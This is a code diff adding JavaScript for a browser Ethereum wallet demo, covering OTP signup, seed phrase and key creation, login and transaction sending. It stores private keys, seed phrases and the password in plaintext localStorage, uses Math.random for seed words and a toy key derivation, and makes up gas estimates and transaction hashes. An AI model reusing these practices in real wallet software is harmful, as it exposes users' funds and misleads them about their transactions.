+    document.getElementById('wallet-password').addEventListener('input', checkPasswordStrength);
+
+    // OTP Input Handling
+    const otpInputs = document.querySelectorAll('.otp-input');
+    otpInputs.forEach(input => {
+      input.addEventListener('input', (e) => {
+        // Move to next input if current input has value
+        if (e.target.value.length === 1) {
+          const nextIndex = parseInt(e.target.dataset.index) + 1;
+          if (nextIndex < otpInputs.length) {
+            otpInputs[nextIndex].focus();
+          }
+        }
+      });
+      
+      input.addEventListener('keydown', (e) => {
+        // Move to previous input on backspace if current input is empty
+        if (e.key === 'Backspace' && e.target.value.length === 0) {
+          const prevIndex = parseInt(e.target.dataset.index) - 1;
+          if (prevIndex >= 0) {
+            otpInputs[prevIndex].focus();
+          }
+        }
+      });
+    });
+
+    // Gas Estimation and Self Transfer Check
+    document.getElementById('send-amount').addEventListener('input', estimateGas);
+    document.getElementById('recipient-address').addEventListener('input', function() {
+      estimateGas();
+      checkSelfTransfer();
+    });
+
+    // Create seed phrase input boxes for login
+    createSeedPhraseInputs();
+
+    // Initialize storage on app start
+    initializeStorage();
+
+    // Initialize Viem clients
+    initializeViemClients();
+
+    // Start App Function
+    function startApp() {
+      introScreen.style.transition = "opacity 2s ease";
+      introScreen.style.opacity = "0";
+      setTimeout(() => {
+        introScreen.style.display = "none";
+        appContainer.style.display = "block";
+        
+        // FIXED: Always show setup choice first, never auto-login
+        showPage(setupChoice);
+      }, 2000);
+    }
+
+    // Page Navigation Function
+    function showPage(page) {
+      // Hide all pages
+      setupChoice.classList.add('hidden');
+      signupPage.classList.add('hidden');
+      otpPage.classList.add('hidden');
+      passwordPage.classList.add('hidden');
+      seedPhrasePage.classList.add('hidden');
+      confirmSeedPage.classList.add('hidden');
+      keysPage.classList.add('hidden');
+      loginPage.classList.add('hidden');
+      walletDashboard.classList.add('hidden');
+      
+      // Show selected page
+      page.classList.remove('hidden');
+    }
+
+    // Create Seed Phrase Input Boxes for Login
+    function createSeedPhraseInputs() {
+      const seedPhraseInputs = document.getElementById('seed-phrase-inputs');
+      seedPhraseInputs.innerHTML = '';
+      
+      for (let i = 0; i < 12; i++) {
+        const inputGroup = document.createElement('div');
+        inputGroup.className = 'seed-input-group';
+        
+        const numberSpan = document.createElement('span');
+        numberSpan.className = 'seed-input-number';
+        numberSpan.textContent = `${i + 1}.`;
+        
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.className = 'seed-input';
+        input.placeholder = `Word ${i + 1}`;
+        input.dataset.index = i;
+        
+        inputGroup.appendChild(numberSpan);
+        inputGroup.appendChild(input);
+        seedPhraseInputs.appendChild(inputGroup);
+      }
+    }
+
+    // Notification Function
+    function showNotification(message, type = 'info') {
+      notificationMessage.textContent = message;
+      notification.className = 'notification';
+      notification.classList.add(type);
+      notification.classList.add('show');
+      
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 5000);
+    }
+
+    // Browser Toast Notification Function
+    function showBrowserToast(message, type = 'info') {
+      browserToastMessage.textContent = message;
+      browserToast.className = 'browser-toast';
+      browserToast.classList.add(type);
+      browserToast.classList.add('show');
+      
+      setTimeout(() => {
+        browserToast.classList.remove('show');
+      }, 4000);
+    }
+
+    // Copy to Clipboard Function
+    function copyToClipboard(elementId, buttonId) {
+      const element = document.getElementById(elementId);
+      const button = document.getElementById(buttonId);
+      const text = element.textContent;
+      
+      navigator.clipboard.writeText(text).then(() => {
+        // Add copied class to button
+        button.classList.add('copied');
+        button.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        
+        showNotification('Copied to clipboard!', 'success');
+        
+        // Reset button after 2 seconds
+        setTimeout(() => {
+          button.classList.remove('copied');
+          button.innerHTML = '<i class="far fa-copy"></i> Copy';
+        }, 2000);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+        showNotification('Failed to copy to clipboard', 'error');
+      });
+    }
+
+    function copySeedPhrase() {
+      const seedPhraseDisplay = document.getElementById('seed-phrase-display');
+      const seedWords = Array.from(seedPhraseDisplay.children).map(wordEl => {
+        return wordEl.textContent.split('.')[1].trim();
+      });
+      
+      const seedPhrase = seedWords.join(' ');
+      const button = document.getElementById('copy-seed-phrase');
+      
+      navigator.clipboard.writeText(seedPhrase).then(() => {
+        // Add copied class to button
+        button.classList.add('copied');
+        button.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        
+        showNotification('Seed phrase copied to clipboard!', 'success');
+        
+        // Reset button after 2 seconds
+        setTimeout(() => {
+          button.classList.remove('copied');
+          button.innerHTML = '<i class="far fa-copy"></i> Copy to Clipboard';
+        }, 2000);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+        showNotification('Failed to copy seed phrase', 'error');
+      });
+    }
+
+    // Check for Self Transfer - FIXED VERSION
+    function checkSelfTransfer() {
+      const recipient = document.getElementById('recipient-address').value;
+      const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+      
+      if (!walletData || !recipient) {
+        selfTransferWarning.classList.remove('show');
+        document.getElementById('send-transaction-button').disabled = false;
+        return;
+      }
+      
+      // Normalize addresses for comparison (case-insensitive)
+      const normalizedRecipient = recipient.toLowerCase().trim();
+      const normalizedWalletAddress = walletData.address.toLowerCase().trim();
+      
+      // Only show warning if addresses are exactly the same (case-insensitive)
+      if (normalizedRecipient === normalizedWalletAddress) {
+        selfTransferWarning.classList.add('show');
+        document.getElementById('send-transaction-button').disabled = true;
+      } else {
+        selfTransferWarning.classList.remove('show');
+        document.getElementById('send-transaction-button').disabled = false;
+      }
+    }
+
+    // Send OTP Function
+    async function sendOTP() {
+      const email = document.getElementById('email').value;
+      const agreeTerms = document.getElementById('agree-terms').checked;
+      const sendOtpButton = document.getElementById('send-otp-button');
+      const sendOtpText = document.getElementById('send-otp-text');
+      const sendOtpLoading = document.getElementById('send-otp-loading');
+      
+      if (!email) {
+        showNotification('Please enter your email address', 'error');
+        return;
+      }
+      
+      if (!agreeTerms) {
+        showNotification('Please agree to the Terms of Service', 'error');
+        return;
+      }
+      
+      // Validate email format
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email)) {
+        showNotification('Please enter a valid email address', 'error');
+        return;
+      }
+      
+      // Show loading state
+      sendOtpButton.disabled = true;
+      sendOtpText.classList.add('hidden');
+      sendOtpLoading.classList.remove('hidden');
+      
+      try {
+        // Generate OTP
+        const otp = generateOTP();
+        localStorage.setItem('pendingOTP', otp);
+        localStorage.setItem('pendingEmail', email);
+        
+        // Display OTP for testing (since email might not work)
+        otpDisplay.textContent = `For testing, your OTP is: ${otp}`;
+        
+        // Try to send OTP via EmailJS
+        const emailSent = await sendEmailOTP(email, otp);
+        
+        if (emailSent) {
+          showNotification(`OTP sent to ${email}`, 'success');
+        } else {
+          showNotification(`OTP generated. Check the display above.`, 'info');
+        }
+        
+        showPage(otpPage);
+      } catch (error) {
+        console.error('Error sending OTP:', error);
+        showNotification('OTP generated. Check the display above.', 'info');
+        showPage(otpPage);
+      } finally {
+        // Reset button state
+        sendOtpButton.disabled = false;
+        sendOtpText.classList.remove('hidden');
+        sendOtpLoading.classList.add('hidden');
+      }
+    }
+
+    // Send OTP via Email
+    async function sendEmailOTP(email, otp) {
+      try {
+        const templateParams = {
+          to_email: email,
+          otp_code: otp,
+          from_name: 'Mini Ethereum Wallet',
+          reply_to: 'jadadevmani1234@gmail.com',
+          subject: 'Your Mini Ethereum Wallet OTP Code'
+        };
+
+        // Try to send using EmailJS
+        const response = await emailjs.send(
+          'service_8u5h6nj', // You need to create this service in EmailJS
+          'template_otp_verification', // You need to create this template in EmailJS
+          templateParams
+        );
+
+        console.log('OTP sent successfully via EmailJS:', response);
+        return true;
+      } catch (error) {
+        console.log('EmailJS failed, using fallback method');
+        
+        // Fallback: Try to send email using a simple method
+        try {
+          const fallbackResponse = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              service_id: 'service_8u5h6nj',
+              template_id: 'template_otp_verification',
+              user_id: 'MAMR9NDYW7I5SZJHEIRI1RKQ9JABN31WXH',
+              template_params: {
+                'to_email': email,
+                'otp_code': otp,
+                'from_name': 'Mini Ethereum Wallet'
+              }
+            })
+          });
+          
+          if (fallbackResponse.ok) {
+            console.log('OTP sent successfully via fallback');
+            return true;
+          }
+        } catch (fallbackError) {
+          console.log('Fallback also failed');
+        }
+        
+        return false;
+      }
+    }
+
+    // Generate OTP
+    function generateOTP() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    // Verify OTP Function
+    function verifyOTP() {
+      const otpInputs = document.querySelectorAll('.otp-input');
+      let enteredOTP = '';
+      otpInputs.forEach(input => {
+        enteredOTP += input.value;
+      });
+      
+      const storedOTP = localStorage.getItem('pendingOTP');
+      
+      if (enteredOTP.length !== 6) {
+        showNotification('Please enter the complete 6-digit OTP', 'error');
+        return;
+      }
+      
+      if (enteredOTP === storedOTP) {
+        // OTP verified, proceed to password creation
+        showPage(passwordPage);
+      } else {
+        showNotification('Invalid OTP. Please try again.', 'error');
+      }
+    }
+
+    // Resend OTP Function
+    function resendOTP() {
+      const email = localStorage.getItem('pendingEmail');
+      const otp = generateOTP();
+      localStorage.setItem('pendingOTP', otp);
+      
+      // Update displayed OTP
+      otpDisplay.textContent = `For testing, your OTP is: ${otp}`;
+      
+      // Try to resend via email
+      sendEmailOTP(email, otp);
+      showNotification(`New OTP generated`, 'info');
+    }
+
+    // Check Password Strength
+    function checkPasswordStrength() {
+      const password = document.getElementById('wallet-password').value;
+      const strengthBar = document.querySelector('.password-strength-bar');
+      const strengthContainer = document.getElementById('password-strength');
+      
+      // Reset
+      strengthContainer.className = 'password-strength';
+      
+      if (password.length === 0) {
+        return;
+      }
+      
+      // Check password strength
+      let strength = 0;
+      
+      // Length check
+      if (password.length >= 8) strength++;
+      
+      // Lowercase check
+      if (/[a-z]/.test(password)) strength++;
+      
+      // Uppercase check
+      if (/[A-Z]/.test(password)) strength++;
+      
+      // Number check
+      if (/[0-9]/.test(password)) strength++;
+      
+      // Special character check
+      if (/[^A-Za-z0-9]/.test(password)) strength++;
+      
+      // Update strength indicator
+      if (strength <= 2) {
+        strengthContainer.classList.add('weak');
+      } else if (strength <= 4) {
+        strengthContainer.classList.add('medium');
+      } else {
+        strengthContainer.classList.add('strong');
+      }
+    }
+
+    // Create Password Function
+    function createPassword() {
+      const password = document.getElementById('wallet-password').value;
+      const confirmPassword = document.getElementById('confirm-password').value;
+      
+      if (!password || !confirmPassword) {
+        showNotification('Please fill in all fields', 'error');
+        return;
+      }
+      
+      if (password !== confirmPassword) {
+        showNotification('Passwords do not match', 'error');
+        return;
+      }
+      
+      // Check password strength
+      const strengthContainer = document.getElementById('password-strength');
+      if (!strengthContainer.classList.contains('strong')) {
+        showNotification('Please create a stronger password', 'error');
+        return;
+      }
+      
+      // Store password temporarily
+      localStorage.setItem('walletPassword', password);
+      
+      // Generate and display seed phrase
+      generateSeedPhrase();
+      showPage(seedPhrasePage);
+    }
+
+    // Generate Seed Phrase
+    function generateSeedPhrase() {
+      const seedWords = [
+        'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
+        'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
+        'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit',
+        'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent'
+      ];
+      
+      const seedPhrase = [];
+      for (let i = 0; i < 12; i++) {
+        const randomIndex = Math.floor(Math.random() * seedWords.length);
+        seedPhrase.push(seedWords[randomIndex]);
+      }
+      
+      // Store seed phrase temporarily
+      localStorage.setItem('pendingSeedPhrase', JSON.stringify(seedPhrase));
+      
+      // Display seed phrase
+      const seedPhraseDisplay = document.getElementById('seed-phrase-display');
+      seedPhraseDisplay.innerHTML = '';
+      
+      seedPhrase.forEach((word, index) => {
+        const wordElement = document.createElement('div');
+        wordElement.className = 'seed-word';
+        wordElement.innerHTML = `<span class="seed-word-number">${index + 1}.</span> ${word}`;
+        seedPhraseDisplay.appendChild(wordElement);
+      });
+    }
+
+    // Confirm Saved Seed Phrase
+    function confirmSavedSeed() {
+      const savedCheckbox = document.getElementById('saved-seed-phrase');
+      
+      if (!savedCheckbox.checked) {
+        showNotification('Please confirm that you have saved your seed phrase', 'error');
+        return;
+      }
+      
+      // Prepare seed phrase confirmation
+      const seedPhrase = JSON.parse(localStorage.getItem('pendingSeedPhrase'));
+      const shuffledSeed = [...seedPhrase].sort(() => Math.random() - 0.5);
+      
+      const confirmSeedOptions = document.getElementById('confirm-seed-options');
+      confirmSeedOptions.innerHTML = '';
+      
+      shuffledSeed.forEach(word => {
+        const wordElement = document.createElement('div');
+        wordElement.className = 'confirm-seed-word';
+        wordElement.textContent = word;
+        wordElement.addEventListener('click', () => selectSeedWord(word));
+        confirmSeedOptions.appendChild(wordElement);
+      });
+      
+      // Reset selected words
+      localStorage.setItem('selectedSeedWords', JSON.stringify([]));
+      document.getElementById('selected-words-container').innerHTML = '';
+      document.getElementById('verify-seed-phrase').disabled = true;
+      
+      showPage(confirmSeedPage);
+    }
+
+    // Select Seed Word for Confirmation
+    function selectSeedWord(word) {
+      const selectedWords = JSON.parse(localStorage.getItem('selectedSeedWords') || '[]');
+      const seedPhrase = JSON.parse(localStorage.getItem('pendingSeedPhrase'));
+      
+      // Add word to selected words
+      selectedWords.push(word);
+      localStorage.setItem('selectedSeedWords', JSON.stringify(selectedWords));
+      
+      // Update UI
+      const selectedWordsContainer = document.getElementById('selected-words-container');
+      const wordElement = document.createElement('div');
+      wordElement.className = 'selected-word';
+      wordElement.innerHTML = `
+        ${word}
+        <button class="remove-word" onclick="removeSeedWord(${selectedWords.length - 1})">
+          <i class="fas fa-times"></i>
+        </button>
+      `;
+      selectedWordsContainer.appendChild(wordElement);
+      
+      // Check if all words are selected
+      if (selectedWords.length === seedPhrase.length) {
+        document.getElementById('verify-seed-phrase').disabled = false;
+      }
+    }
+
+    // Remove Seed Word from Selection
+    function removeSeedWord(index) {
+      const selectedWords = JSON.parse(localStorage.getItem('selectedSeedWords'));
+      selectedWords.splice(index, 1);
+      localStorage.setItem('selectedSeedWords', JSON.stringify(selectedWords));
+      
+      // Refresh UI
+      const selectedWordsContainer = document.getElementById('selected-words-container');
+      selectedWordsContainer.innerHTML = '';
+      
+      selectedWords.forEach((word, i) => {
+        const wordElement = document.createElement('div');
+        wordElement.className = 'selected-word';
+        wordElement.innerHTML = `
+          ${word}
+          <button class="remove-word" onclick="removeSeedWord(${i})">
+            <i class="fas fa-times"></i>
+          </button>
+        `;
+        selectedWordsContainer.appendChild(wordElement);
+      });
+      
+      document.getElementById('verify-seed-phrase').disabled = true;
+    }
+
+    // Verify Seed Phrase
+    function verifySeedPhrase() {
+      const selectedWords = JSON.parse(localStorage.getItem('selectedSeedWords'));
+      const seedPhrase = JSON.parse(localStorage.getItem('pendingSeedPhrase'));
+      
+      // Check if the order is correct
+      let correct = true;
+      for (let i = 0; i < seedPhrase.length; i++) {
+        if (selectedWords[i] !== seedPhrase[i]) {
+          correct = false;
+          break;
+        }
+      }
+      
+      if (correct) {
+        // Seed phrase verified, create wallet
+        createWallet();
+      } else {
+        showNotification('Incorrect seed phrase order. Please try again.', 'error');
+        // Reset selection
+        localStorage.setItem('selectedSeedWords', JSON.stringify([]));
+        document.getElementById('selected-words-container').innerHTML = '';
+        document.getElementById('verify-seed-phrase').disabled = true;
+      }
+    }
+
+    // Create Wallet Function
+    function createWallet() {
+      // Generate wallet using Viem
+      const privateKey = window.viem.generatePrivateKey();
+      const newAccount = window.viem.privateKeyToAccount(privateKey);
+      const address = newAccount.address;
+      const seedPhrase = JSON.parse(localStorage.getItem('pendingSeedPhrase'));
+      
+      // Store wallet in localStorage
+      const email = localStorage.getItem('pendingEmail');
+      const password = localStorage.getItem('walletPassword');
+      
+      const walletData = {
+        privateKey: privateKey,
+        address: address,
+        seedPhrase: seedPhrase,
+        email: email,
+        password: password,
+        networkBalances: { ...initialNetworkBalances },
+        network: currentNetwork,
+        created: new Date().toISOString()
+      };
+      
+      // Save to global storage
+      saveWallet(walletData);
+      localStorage.setItem(CURRENT_WALLET_KEY, JSON.stringify(walletData));
+      
+      // Initialize Viem wallet client for current network
+      if (publicClient) {
+        const chain = viemChains[currentNetwork] || window.viem.holesky;
+        const rpcUrl = rpcUrls[currentNetwork] || 'https://ethereum-holesky-rpc.publicnode.com';
+        
+        walletClient = window.viem.createWalletClient({
+          account: newAccount,
+          chain: chain,
+          transport: window.viem.http(rpcUrl),
+        });
+        account = newAccount;
+      }
+      
+      // Display keys on keys page
+      document.getElementById('public-address-display').textContent = address;
+      document.getElementById('private-key-display').textContent = privateKey;
+      
+      showPage(keysPage);
+    }
+
+    // Confirm Saved Keys
+    function confirmSavedKeys() {
+      const savedCheckbox = document.getElementById('saved-keys');
+      
+      if (!savedCheckbox.checked) {
+        showNotification('Please confirm that you have saved your keys', 'error');
+        return;
+      }
+      
+      // Clean up temporary data
+      localStorage.removeItem('pendingOTP');
+      localStorage.removeItem('pendingEmail');
+      localStorage.removeItem('walletPassword');
+      localStorage.removeItem('pendingSeedPhrase');
+      localStorage.removeItem('selectedSeedWords');
+      
+      // Initialize and show wallet dashboard
+      initializeWalletDashboard();
+      showPage(walletDashboard);
+      showNotification(`Mini Ethereum Wallet created successfully! You received ${initialNetworkBalances[currentNetwork]} ETH for testing on ${networkNames[currentNetwork]}.`, 'success');
+    }
+
+    // Login with Private Key Function
+    function loginWithPrivateKey() {
+      const privateKey = document.getElementById('private-key-login').value;
+      
+      if (!privateKey) {
+        showNotification('Please enter your private key', 'error');
+        return;
+      }
+      
+      if (!privateKey.startsWith('0x') || privateKey.length !== 66) {
+        showNotification('Invalid private key format', 'error');
+        return;
+      }
+      
+      try {
+        // Generate address from private key using Viem
+        const newAccount = window.viem.privateKeyToAccount(privateKey);
+        const address = newAccount.address;
+        
+        // Check if wallet already exists in storage
+        let walletData = getWalletByAddress(address);
+        
+        if (walletData) {
+          // Existing wallet, just update network balances if needed
+          if (!walletData.networkBalances) {
+            walletData.networkBalances = { ...initialNetworkBalances };
+          }
+        } else {
+          // New wallet
+          walletData = {
+            privateKey: privateKey,
+            address: address,
+            imported: true,
+            networkBalances: { ...initialNetworkBalances },
+            network: currentNetwork,
+            created: new Date().toISOString()
+          };
+          saveWallet(walletData);
+        }
+        
+        localStorage.setItem(CURRENT_WALLET_KEY, JSON.stringify(walletData));
+        
+        // Initialize Viem wallet client for current network
+        if (publicClient) {
+          const chain = viemChains[currentNetwork] || window.viem.holesky;
+          const rpcUrl = rpcUrls[currentNetwork] || 'https://ethereum-holesky-rpc.publicnode.com';
+          
+          walletClient = window.viem.createWalletClient({
+            account: newAccount,
+            chain: chain,
+            transport: window.viem.http(rpcUrl),
+          });
+          account = newAccount;
+        }
+        
+        // Show browser toast notification
+        showBrowserToast('Private key imported successfully! Your wallet is now accessible.', 'success');
+        
+        initializeWalletDashboard();
+        showPage(walletDashboard);
+        showNotification(`Mini Ethereum Wallet accessed successfully! You received ${initialNetworkBalances[currentNetwork]} ETH for testing on ${networkNames[currentNetwork]}.`, 'success');
+      } catch (error) {
+        console.error('Error importing private key:', error);
+        showNotification('Invalid private key', 'error');
+      }
+    }
+
+    // Login with Seed Phrase Function
+    function loginWithSeedPhrase() {
+      const seedInputs = document.querySelectorAll('#seed-phrase-inputs .seed-input');
+      const seedWords = [];
+      
+      // Collect all seed words
+      seedInputs.forEach(input => {
+        if (input.value.trim()) {
+          seedWords.push(input.value.trim().toLowerCase());
+        }
+      });
+      
+      if (seedWords.length !== 12) {
+        showNotification('Please enter all 12 seed phrase words', 'error');
+        return;
+      }
+      
+      // Generate private key from seed phrase (simplified)
+      const privateKey = generatePrivateKeyFromSeed(seedWords);
+      
+      try {
+        const newAccount = window.viem.privateKeyToAccount(privateKey);
+        const address = newAccount.address;
+        
+        // Check if wallet already exists in storage
+        let walletData = getWalletByAddress(address);
+        
+        if (walletData) {
+          // Existing wallet, just update network balances if needed
+          if (!walletData.networkBalances) {
+            walletData.networkBalances = { ...initialNetworkBalances };
+          }
+        } else {
+          // New wallet
+          walletData = {
+            privateKey: privateKey,
+            address: address,
+            seedPhrase: seedWords,
+            imported: true,
+            networkBalances: { ...initialNetworkBalances },
+            network: currentNetwork,
+            created: new Date().toISOString()
+          };
+          saveWallet(walletData);
+        }
+        
+        localStorage.setItem(CURRENT_WALLET_KEY, JSON.stringify(walletData));
+        
+        // Initialize Viem wallet client for current network
+        if (publicClient) {
+          const chain = viemChains[currentNetwork] || window.viem.holesky;
+          const rpcUrl = rpcUrls[currentNetwork] || 'https://ethereum-holesky-rpc.publicnode.com';
+          
+          walletClient = window.viem.createWalletClient({
+            account: newAccount,
+            chain: chain,
+            transport: window.viem.http(rpcUrl),
+          });
+          account = newAccount;
+        }
+        
+        // Show browser toast notification
+        showBrowserToast('Seed phrase imported successfully! Your wallet is now accessible.', 'success');
+        
+        initializeWalletDashboard();
+        showPage(walletDashboard);
+        showNotification(`Mini Ethereum Wallet accessed successfully! You received ${initialNetworkBalances[currentNetwork]} ETH for testing on ${networkNames[currentNetwork]}.`, 'success');
+      } catch (error) {
+        console.error('Error importing seed phrase:', error);
+        showNotification('Invalid seed phrase', 'error');
+      }
+    }
+
+    // Generate Private Key from Seed (simplified)
+    function generatePrivateKeyFromSeed(seedWords) {
+      // In a real implementation, you would use a proper key derivation function
+      // This is a simplified version for demonstration
+      let seedString = seedWords.join('');
+      let privateKey = '0x';
+      
+      for (let i = 0; i < 64; i++) {
+        const charCode = seedString.charCodeAt(i % seedString.length);
+        privateKey += (charCode % 16).toString(16);
+      }
+      
+      return privateKey;
+    }
+
+    // Initialize Wallet Dashboard
+    function initializeWalletDashboard() {
+      const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+      
+      if (walletData) {
+        // Display wallet address
+        document.getElementById('wallet-address-display').textContent = walletData.address;
+        document.getElementById('receive-address').textContent = walletData.address;
+        
+        // Set balance for current network
+        const currentBalance = walletData.networkBalances ? walletData.networkBalances[currentNetwork] : initialNetworkBalances[currentNetwork];
+        document.getElementById('wallet-balance').textContent = `${currentBalance.toFixed(4)} ETH`;
+        
+        // Set current network
+        currentNetwork = walletData.network || 'sepolia';
+        document.getElementById('current-network').textContent = networkNames[currentNetwork];
+        
+        // Update network selector
+        document.querySelectorAll('.network-option').forEach(option => {
+          option.classList.remove('active');
+          if (option.dataset.network === currentNetwork) {
+            option.classList.add('active');
+          }
+        });
+        
+        // Load transaction history
+        loadTransactionHistory();
+        
+        // Start balance update interval if using Viem
+        if (account && publicClient) {
+          if (balanceInterval) clearInterval(balanceInterval);
+          balanceInterval = setInterval(updateViemBalance, 15000);
+          updateViemBalance();
+        }
+      }
+    }
+
+    // Update balance using Viem
+    async function updateViemBalance() {
+      if (!account || !publicClient) return;
+      
+      try {
+        const balance = await publicClient.getBalance({ address: account.address });
+        const formattedBalance = window.viem.formatEther(balance);
+        document.getElementById('wallet-balance').textContent = `${parseFloat(formattedBalance).toFixed(4)} ETH`;
+        
+        // Update the stored balance as well
+        const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+        if (walletData) {
+          walletData.networkBalances[currentNetwork] = parseFloat(formattedBalance);
+          localStorage.setItem(CURRENT_WALLET_KEY, JSON.stringify(walletData));
+          saveWallet(walletData);
+        }
+      } catch (error) {
+        console.error('Could not fetch balance:', error);
+        // Fall back to local balance
+        const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+        if (walletData && walletData.networkBalances) {
+          document.getElementById('wallet-balance').textContent = `${walletData.networkBalances[currentNetwork].toFixed(4)} ETH`;
+        }
+      }
+    }
+
+    // Load Transaction History - FIXED VERSION
+    function loadTransactionHistory() {
+      const transactionHistory = document.getElementById('transaction-history');
+      transactionHistory.innerHTML = '';
+      
+      const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+      if (!walletData) {
+        transactionHistory.innerHTML = '<p style="text-align: center; color: rgba(255,255,255,0.7);">No wallet data found</p>';
+        return;
+      }
+      
+      const transactions = getTransactionsForAddress(walletData.address);
+      const txFilter = document.getElementById('txFilter');
+      const filter = txFilter ? txFilter.value : 'all';
+      
+      if (transactions.length === 0) {
+        transactionHistory.innerHTML = '<p style="text-align: center; color: rgba(255,255,255,0.7);">No transactions yet</p>';
+        return;
+      }
+      
+      // Filter transactions based on selection
+      const filteredTransactions = transactions.filter(tx => {
+        if (filter === 'all') return true;
+        if (filter === 'in') return tx.direction === 'in';
+        if (filter === 'out') return tx.direction === 'out';
+        return true;
+      });
+      
+      if (filteredTransactions.length === 0) {
+        transactionHistory.innerHTML = `<p style="text-align: center; color: rgba(255,255,255,0.7);">No ${filter} transactions</p>`;
+        return;
+      }
+      
+      // Display transactions
+      filteredTransactions.forEach(tx => {
+        const txElement = document.createElement('div');
+        txElement.className = `tx-item ${tx.status === 'failed' ? 'tx-failed' : ''}`;
+        
+        const isSent = tx.direction === 'out';
+        const date = new Date(tx.timestamp);
+        const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}`;
+        
+        const amountPrefix = isSent ? '-' : '+';
+        const amountColor = isSent ? 'var(--error-color)' : 'var(--success-color)';
+        const directionClass = isSent ? 'tx-direction-out' : 'tx-direction-in';
+        const directionText = isSent ? 'OUT' : 'IN';
+        const counterparty = isSent ? tx.to : tx.from;
+        
+        // Use the actual transaction hash if available, otherwise generate a valid one
+        const txHash = tx.hash && tx.hash.startsWith('0x') ? tx.hash : generateValidTransactionHash();
+        
+        txElement.innerHTML = `
+          <div class="tx-details">
+            <span class="tx-direction ${directionClass}">${directionText}</span>
+            <div class="tx-info">
+              <div class="tx-amount" style="color: ${amountColor}"><strong>${amountPrefix} ${tx.value} ETH</strong></div>
+              <div class="tx-address">${isSent ? 'To' : 'From'}: ${truncateAddress(counterparty)}</div>
+              <div class="tx-meta">
+                <span class="tx-status">${tx.status === 'confirmed' ? '✅ Success' : '⏳ Pending'}</span>
+                <span class="tx-time">${formattedDate}</span>
+                ${tx.gasFee > 0 ? `<span class="tx-fee">Gas: ${tx.gasFee} ETH</span>` : ''}
+              </div>
+            </div>
+          </div>
+          <div class="tx-link">
+            <a href="${etherscanUrls[currentNetwork]}/tx/${txHash}" target="_blank" rel="noopener noreferrer">
+              Details ↗
+            </a>
+          </div>
+        `;
+        
+        transactionHistory.appendChild(txElement);
+      });
+      
+      // Add transaction count
+      const countElement = document.createElement('div');
+      countElement.className = 'tx-count';
+      countElement.textContent = `Showing ${filteredTransactions.length} of ${transactions.length} transactions`;
+      transactionHistory.appendChild(countElement);
+    }
+
+    // Generate a valid transaction hash for Etherscan
+    function generateValidTransactionHash() {
+      // Generate a valid Ethereum transaction hash (64 hex characters after 0x)
+      let hash = '0x';
+      const chars = '0123456789abcdef';
+      for (let i = 0; i < 64; i++) {
+        hash += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return hash;
+    }
+
+    // Refresh History
+    function refreshHistory() {
+      const btn = document.getElementById('refreshHistoryBtn');
+      const txFilter = document.getElementById('txFilter');
+      const filter = txFilter ? txFilter.value : 'all';
+      
+      btn.classList.add('loading');
+      btn.innerHTML = '⏳ Loading...';
+      
+      loadTransactionHistory();
+      
+      setTimeout(() => {
+        btn.classList.remove('loading');
+        btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
+      }, 1000);
+    }
+
+    // Helper function to truncate address
+    function truncateAddress(address) {
+      if (!address) return 'Unknown';
+      return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+    }
+
+    // Estimate Gas Function
+    function estimateGas() {
+      const amount = document.getElementById('send-amount').value;
+      const recipient = document.getElementById('recipient-address').value;
+      
+      if (amount && recipient) {
+        const gasEstimate = (0.00021 + Math.random() * 0.0001).toFixed(6);
+        const totalEstimate = (parseFloat(amount) + parseFloat(gasEstimate)).toFixed(6);
+        document.getElementById('gas-estimate').textContent = `${gasEstimate} ETH`;
+        document.getElementById('total-estimate').textContent = `${totalEstimate} ETH`;
+      } else {
+        document.getElementById('gas-estimate').textContent = '0 ETH';
+        document.getElementById('total-estimate').textContent = '0 ETH';
+      }
+    }
+
+    // Send Transaction Function - FIXED VERSION
+    async function sendTransaction() {
+      const recipient = document.getElementById('recipient-address').value;
+      const amount = parseFloat(document.getElementById('send-amount').value);
+      const gasEstimate = parseFloat(document.getElementById('gas-estimate').textContent.split(' ')[0]);
+      
+      if (!recipient || !amount) {
+        showNotification('Please fill in all fields', 'error');
+        return;
+      }
+      
+      if (!recipient.startsWith('0x') || recipient.length !== 42) {
+        showNotification('Invalid recipient address', 'error');
+        return;
+      }
+      
+      // Check for self-transfer - FIXED COMPARISON
+      const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+      if (recipient.toLowerCase().trim() === walletData.address.toLowerCase().trim()) {
+        showNotification('You cannot send funds to your own wallet address', 'error');
+        return;
+      }
+      
+      // Check if user has enough balance
+      const currentBalance = walletData.networkBalances ? walletData.networkBalances[currentNetwork] : initialNetworkBalances[currentNetwork];
+      const totalCost = amount + gasEstimate;
+      if (totalCost > currentBalance) {
+        showNotification(`Insufficient balance. You need ${totalCost.toFixed(6)} ETH but only have ${currentBalance.toFixed(4)} ETH`, 'error');
+        return;
+      }
+      
+      // Try to send using Viem if available
+      if (walletClient && account) {
+        try {
+          const sendButton = document.getElementById('send-transaction-button');
+          sendButton.disabled = true;
+          sendButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
